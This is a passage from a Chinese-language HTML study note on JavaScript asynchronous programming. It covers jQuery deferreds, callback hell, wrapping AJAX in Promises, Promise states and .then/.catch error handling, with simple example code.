style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">添加新的代码，不用修改旧的代码，而是扩展新的代码，程序易于维护和测试</span></span></div><div><br/></div><div><span style="font-size: 12pt;">但是这里有个问题：w 可以在函数外主动调用 resolve() 或 reject() ，这将改变执行结果，</span><span style="font-size: 12pt;">resolve() .reject() </span> <span style="font-size: 12pt;">.then() 混在一块了，后果很严重！</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [92].jpg" type="image/jpeg" data-filename="3.jpg" width="385"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [93].jpg" type="image/jpeg" data-filename="3.jpg" width="416"/></div><div><br/></div><div><span style="font-size: 12pt;">return dtd.promise() 返回一个 promise 对象后 w 无法</span><span style="font-size: 12pt;">主动调用 resolve() 或 reject()，只能使用 .then() 被动监听，</span></div><div><br/></div><div><span style="font-size: 12pt;">这样 </span><span style="font-size: 12pt;">resolve() .reject()  与 .then() 隔离了，异步任务</span><span style="font-size: 12pt;">执行完成后结果就不会被篡改了</span></div><div><br/></div><div><span style="font-size: 12pt;">返回 promise 对象后需要 $.when() 包装一层后才可使用 .then()</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [94].jpg" type="image/jpeg" data-filename="3.jpg" width="834"/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><font style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">AJAX 回调的问题</span></font></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">不同库的 ajax 参数和用法不一样，Promise 是确定函数形式的规范</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">如何处理多个 ajax 都成功之后再调用某个回调函数？</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">  1：Promise</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">  2：类似 jQuery 的延迟对象，利用$.when()</span></div><div><br/></div><div><span style="font-size: 12pt;"><a href="https://github.com/FrankFang/sign-in-demo" style="font-size: 12pt;">https://github.com/FrankFang/sign-in-demo</a></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">什么是 Promise </span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><a href="https://es6.ruanyifeng.com/#docs/promise" style="font-size: 12pt;">https://es6.ruanyifeng.com/#docs/promise</a></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Promise 最初被提出是在 E 语言中， 它是基于并列/并行处理设计的一种编程语言。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;"><font color="#000000">当一个操作开始执行后，主程序无需等待它的完成，可以继续向下执行。此时该操作可以跟主程序同时（并发）执行。这种操作我们就称之为异步操作。 </font></span></div><div><span style="font-size: 12pt;"><font color="#000000"><br/></font></span></div><div><span style="font-size: 12pt;"><font color="#000000">通常当异步操作完成时，会执行一个我们事先设定好的回调函数来做后续的处理。</font></span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">是异步编程的一种解决方案，</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">它解决了 ajax 请求过程中的回调地狱的问题。</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 也是在用写同步代码的方式去写异步代码，顺便解决回调地狱。（new 中同步，then 中异步）</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">是表示异步操作完成或失败的对象，</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">包含一个状态 PromiseStatus 和一个值 PromiseValue，</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">是一个值的占位符，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">本质上，这是浏览器说“我保证尽快给您答复”的方式，因此得名“promise”。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">所谓 Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 对象用于表示一个异步操作的最终状态（完成或失败）以及异步操作的返回值。</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">—— MDN</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Promise 是 window 下的属性：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">window.Promise = function (fn) {</span></div><div><span style="font-size: 12pt;">    // ...</span></div><div><span style="font-size: 12pt;">    return {</span></div><div><span style="font-size: 12pt;">        then: function () { }</span></div><div><span style="font-size: 12pt;">    }    </span></div><div><span style="font-size: 12pt;">}</span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Promise 第一个意义：解决回调地狱，不用记是要用 success 还是 error（不用取成功或失败的名字）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">Promise 第二个意义：可以把上一次处理返回的结果接着处理</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">回调地狱使得异步任务的代码比同步任务的代码更难读：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">// 方法 模拟请求数据</span></div><div><span style="font-size: 12pt;">function f(cb) {</span></div><div><span style="font-size: 12pt;">    setTimeout(function() {</span></div><div><span style="font-size: 12pt;">        cb &amp;&amp; cb(); // 表示如果有传函数，那就调用它</span></div><div><span style="font-size: 12pt;">    }, 1000);</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">// 回调地狱（业务需求：这次请求之后，依赖前n次请求的数据再进行下次请求。如果搞反了，需要调换位置则难以维护了）</span></div><div><span style="font-size: 12pt;">f(function() {</span></div><div><span style="font-size: 12pt;">    console.log(1);</span></div><div><span style="font-size: 12pt;">    f(function() {</span></div><div><span style="font-size: 12pt;">        console.log(2);</span></div><div><span style="font-size: 12pt;">        f(function() {</span></div><div><span style="font-size: 12pt;">            console.log(3);</span></div><div><span style="font-size: 12pt;">            f(function() {</span></div><div><span style="font-size: 12pt;">                console.log(4);</span></div><div><span style="font-size: 12pt;">                f(function() {</span></div><div><span style="font-size: 12pt;">                    console.log(5);</span></div><div><span style="font-size: 12pt;">                    f(function() {</span></div><div><span style="font-size: 12pt;">                        console.log(6);</span></div><div><span style="font-size: 12pt;">                    });</span></div><div><span style="font-size: 12pt;">                });</span></div><div><span style="font-size: 12pt;">            });</span></div><div><span style="font-size: 12pt;">        });</span></div><div><span style="font-size: 12pt;">    });</span></div><div><span style="font-size: 12pt;">});</span></div></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [95].jpg" type="image/jpeg" data-filename="3.jpg" width="708"/></div><div><br/></div><div><span style="font-size: 12pt;">回调地狱带来的负面作用有以下几点：</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">可读性差</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">容易滋生 bug</span></div><div><br/></div><div><span style="font-size: 12pt;">● 代码臃肿</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">代码复用性差</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">耦合度过高，可维护性差</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">只能在回调里处理异常</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">传统的回调方式实现异步请求</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">// 需求：当一个ajax结束后，得到的值，需要作为另外一个ajax的参数被使用（即该参数得从上一个ajax请求中获取）</font></div><div><font style="font-size: 12pt;">var url = 'XXXXXX';</font></div><div><font style="font-size: 12pt;">var result;</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">var XHR = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">XHR.open('GET', url, true);    // 第一个ajax请求</font></div><div><font style="font-size: 12pt;">XHR.send();</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">XHR.onreadystatechange = function () {</font></div><div><font style="font-size: 12pt;">    if (XHR.readyState == 4 &amp;&amp; XHR.status == 200) {</font></div><div><font style="font-size: 12pt;">        result = XHR.response;</font></div><div><font style="font-size: 12pt;">        console.log(result);</font></div><div><font style="font-size: 12pt;">        // 伪代码</font></div><div><font style="font-size: 12pt;">        var url2 = 'XXXXXX' + result.someParams;    // 通过第一个ajax请求的结果，得到第二个ajax请求所需要的url</font></div><div><font style="font-size: 12pt;">        var XHR2 = new XMLHttpRequest();</font></div><div><font style="font-size: 12pt;">        XHR2.open('GET', url2, true);               // 第二个ajax请求</font></div><div><font style="font-size: 12pt;">        XHR2.send();</font></div><div><font style="font-size: 12pt;">        XHR2.onreadystatechange = function () {</font></div><div><font style="font-size: 12pt;">            ...</font></div><div><font style="font-size: 12pt;">            // 往复上述过程，会得到第三个ajax请求所需要的url值，然后进行第三个ajax请求，再得到第四个……  超恐怖</font></div><div><font style="font-size: 12pt;">        }</font></div><div><font style="font-size: 12pt;">    }</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">Promise </span><span style="font-size: 12pt; font-weight: bold;">封装 ajax 解决回调地狱问题</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">var url = 'XXXXX';</span></div><div><br/></div><div><span style="font-size: 12pt;">// 封装一个get请求的方法</span></div><div><span style="font-size: 12pt;">function getJSON(url) {</span></div><div><span style="font-size: 12pt;">    return new Promise((resolve, reject) =&gt; {</span></div><div><span style="font-size: 12pt;">        var XHR = new XMLHttpRequest();</span></div><div><span style="font-size: 12pt;">        XHR.open('GET', url, true);</span></div><div><span style="font-size: 12pt;">        XHR.send();</span></div><div><span style="font-size: 12pt;">        XHR.onreadystatechange = function () {</span></div><div><span style="font-size: 12pt;">            if (XHR.readyState == 4) {</span></div><div><span style="font-size: 12pt;">                if (XHR.status == 200) {</span></div><div><span style="font-size: 12pt;">                    try {</span></div><div><span style="font-size: 12pt;">                        var response = JSON.parse(XHR.responseText);</span></div><div><span style="font-size: 12pt;">                        resolve(response);</span></div><div><span style="font-size: 12pt;">                    } </span></div><div><span style="font-size: 12pt;">                    catch (e) {</span></div><div><span style="font-size: 12pt;">                        reject(e);</span></div><div><span style="font-size: 12pt;">                    }</span></div><div><span style="font-size: 12pt;">                } </span></div><div><span style="font-size: 12pt;">                else {</span></div><div><span style="font-size: 12pt;">                    reject(new Error(XHR.statusText));</span></div><div><span style="font-size: 12pt;">                }</span></div><div><span style="font-size: 12pt;">            }</span></div><div><span style="font-size: 12pt;">        }</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">}</span></div><div><br/></div><div><span style="font-size: 12pt;">getJSON(url)</span></div><div><span style="font-size: 12pt;">    .then(resp =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(response);</span></div><div><span style="font-size: 12pt;">        return url2 = 'http:xxx.yyy.com/zzz?ddd=' + resp;</span></div><div><span style="font-size: 12pt;">    })</span></div><div><span style="font-size: 12pt;">    .then(resp =&gt; {</span></div><div><span style="font-size: 12pt;">        console.log(response);</span></div><div><span style="font-size: 12pt;">        return url3 = 'http:xxx.yyy.com/zzz?ddd=' + resp;</span></div><div><span style="font-size: 12pt;">    });</span></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><hr/><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise </span></span><span style="font-size: 12pt; font-weight: bold;">总结</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 是浏览器 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">JavaScipt</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">引擎自带的构造函数（或对象）。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 是一个保存异步操作结果的容器，当一个异步操作完成，Promise 要么保存了完成的值，要么保存失败的错误信息。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 对异步请求进行了分割，将请求与操作分离。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">网络加载数据的代码，它就像一位“歌手”（请求）     setTimeout(function() {})。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">许多函数需要歌手的结果，这些就是“粉丝”（操作）  .then(res =&gt; {})。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 是一个特殊的 JavaScript 对象，是将“歌手”和“粉丝”连接在一起的“经纪人”，等“歌手”结果出来时，将结果向所有“粉丝”开放。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [17].gif" type="image/gif" data-filename="3.gif" width="720"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise 是一个对象，它包含一个状态 PromiseStatus 和一个值 PromiseValue。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">在上面的例子中，你可以看到 PromiseStatus 的值是 pending, PromiseValue 的值是 undefined。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">不过 - 你永远不会与这个对象进行交互，你甚至不能访问 PromiseStatus 和 PromiseValue 这两个属性！</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">PromiseStatus 的值是 Promise 的状态，它可以是下面三种值之一：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● fulfilled: 表示这个 promise 已经被 resolved，一切正常，在这个 promise 内没有错误发生。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> rejected: 表示这个 promise 已经被 rejected，啊，有错误发生了。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> pending: 表示这个 promise 既没有被 resolved 也没有被 rejected</span><span style="font-size: 12pt;">，promise 刚被创建后的初始化状态。</span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">状态不可逆：</span></font></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">promise 对象的状态，从 pending 转换为 fulfilled 或 rejected 之后， 这个 promise 对象的状态就不会再发生任何变化。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">创建 promise 对象：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">new Promise(function(resolve, reject) {}))</span></div></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 构造函数里有一个回调函数： </span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">function(resolve, reject) {} 叫做 executor，会自动立即执行。</span></div><div><br/></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">这个回调函数接受两个参数：</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve 和 reject，这两个参数由 JavaScipt 引擎预先定义。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">第一个参数通常叫作 resolve 或者简称 res，这个方法是当这个 promise 被 resolve 时候调用，</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">第二个参数</span></span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">通常叫作</span> <span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">reject 或者简称 rej，这个方法是当这个 promise 被 reject 时候调用，意味着程序出错了。</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve 表示确定、解决了这个 promise， reject 表示否定 、拒绝了这个 promise</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">new Promise(fn) 会返回一个 promise 对象：</span></div><div><br/></div><div><span style="font-size: 12pt;">在 fn 中指定异步等处理</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">处理结果正常的话，调用 resolve(处理结果值)</span></div><div><br/></div><div><span style="font-size: 12pt;">● </span><span style="font-size: 12pt;">处理结果错误的话，调用 reject(Error对象)</span></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [96].jpg" type="image/jpeg" data-filename="3.jpg" width="880"/></div><div><br/></div><div><img src="8 - EventLoop 、AJAX、异步编程_files/3 [18].gif" type="image/gif" data-filename="3.gif" width="720"/></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> 当我们调用 resolve 方法时，promise 的状态是 fulfilled 。</span></div><div><font color="#7600D8" style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">●</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"> 当我们调用 reject 方法时，promise 的状态是 rejected 。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">fulfilled 和 rejected 这两个中的任一状态都可以表示为 settled(不变的)。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">所以，promise 的状态只有两种：p</span></span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">ending 和 settled</span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">OK，让我们再写一个示例，这次我们传入 resolve、reject </span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [19].gif" type="image/gif" data-filename="3.gif" width="720"/></span></span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;">不错，我们现在知道怎么去改变默认的 status 值 pending，value值 undefined。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果我们调用 resolve 方法那么 status 就会变为 fulfilled。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">同理，我们调用 reject 方法那么 status 变为 rejected。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">相应的一个promise[[PromiseValue]]的值 value 就是我们调用 resolve 或者 reject 方法时候传递的参数。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 一旦从等待状态变成为其他状态就永远不能更改状态了，也就是说一旦状态变为 resolved 后，就不能再次改变</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">new Promise((resolve, reject) =&gt; {</font></div><div><font style="font-size: 12pt;">  resolve('success')</font></div><div><font style="font-size: 12pt;">  // 无效</font></div><div><font style="font-size: 12pt;">  reject('reject')</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><br/></div><div><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">resolve 和 reject 后的处理</span></font></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve() 、reject() 两个方法都可以</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">接收参数结果并传递给 .then()处理。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve 后的处理，是 .then 的第一个参数（回调函数）。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">reject 后的处理，要么是 .then 的第二个参数</span></span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">（回调函数）</span><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">，要么是 .catch 的一个回调函数。</span></span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">每个 .then() 可以</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">接收两个函数作为参数，第一个函数 resolve() 时调用，第二个函数 reject() 时调用。</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">let promise = new Promise(function(resolve, reject) {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt;</span> <span style="font-size: 12pt; font-weight: bold;">resolve(&quot;done!&quot;)</span><span style="font-size: 12pt;">, 1000);</span></div><div><span style="font-size: 12pt; font-weight: bold;">});</span></div><div><br/></div><div><span style="font-size: 12pt;">// resolve 运行 .then 中的第一个函数</span></div><div><span style="font-size: 12pt; font-weight: bold;">promise.then(</span></div><div><span style="font-size: 12pt; font-weight: bold;">  result =&gt; alert(result), // 1 秒后显示 &quot;done!&quot;</span></div><div><span style="font-size: 12pt;">  error =&gt; alert(error) // 不运行</span></div><div><span style="font-size: 12pt; font-weight: bold;">);</span></div></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt; font-weight: bold;">let promise = new Promise(function(resolve, reject) {</span></div><div><span style="font-size: 12pt;">  setTimeout(() =&gt;</span> <span style="font-size: 12pt; font-weight: bold;">reject(new Error(&quot;Whoops!&quot;)</span><span style="font-size: 12pt;">), 1000);</span></div><div><span style="font-size: 12pt; font-weight: bold;">});</span></div><div><br/></div><div><span style="font-size: 12pt;">// reject 运行 .then 中的第二个函数</span></div><div><span style="font-size: 12pt; font-weight: bold;">promise.then(</span></div><div><span style="font-size: 12pt;">  result =&gt; alert(result), // 不运行</span></div><div><span style="font-size: 12pt;"> </span><span style="font-size: 12pt; font-weight: bold;"> error =&gt; alert(error) // 1 秒后显示 &quot;Error: Whoops!&quot;</span></div><div><span style="font-size: 12pt; font-weight: bold;">);</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">每个 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then()  接收一个函数作为参数时，该函数参数只在 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">resolve() 时调用，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">需要使用 .catch() 进行异常捕获。</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">下面代码中所 fetch 的 URL 是错的（没有这个网站），.catch 对这个 error 进行了处理：</span></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><span style="font-size: 12pt;">fetch('<font color="#000000">https://no-such-server.blabla'</font>) // rejects</span></div><div><span style="font-size: 12pt;">  .then(response =&gt; response.json())</span></div><div><span style="font-size: 12pt;">  .catch(err =&gt; alert(err)) // TypeError: failed to fetch（这里的文字可能有所不同）</span></div></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">Promise 的 executor 和 promise 的处理函数</span> <span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">.then/catch/finally </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">有一个“隐式的 try..catch”。如果发生异常，异常就会被捕获。</span></div><div><font style="font-size: 12pt;"><br/></font></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(255, 0, 0); font-weight: bold;">一般来说，不在 then() 方法里面定义 Reject 状态的回调函数（即 then 的第二个参数），而是使用 catch 方法。</span></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; font-weight: bold;">.catch 可以处理 promise 中的各种 error：</span></div><div><br/></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在 </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">executor </span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">抛出的（throw）error</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; 